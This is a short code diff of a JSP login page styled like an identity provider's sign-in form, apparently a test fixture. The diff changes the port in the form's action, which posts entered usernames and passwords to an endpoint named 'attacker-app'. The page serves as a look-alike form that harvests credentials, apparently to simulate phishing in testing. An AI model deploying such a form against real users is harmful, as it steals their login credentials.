@@ -71,7 +71,7 @@
                 <div id="kc-form">
                     <div id="kc-form-wrapper">
                         <form id="kc-form-login" onsubmit="login.disabled = true; return true;"
-                              action="http://<%=request.getServerName()%>:9999/attacker-app/index.jsp"
+                              action="http://<%=request.getServerName()%>:9080/attacker-app/index.jsp"
                               method="post">
                             <div class="form-group">
                                 <label for="username" class="pf-c-form__label pf-c-form__label-text">Username or
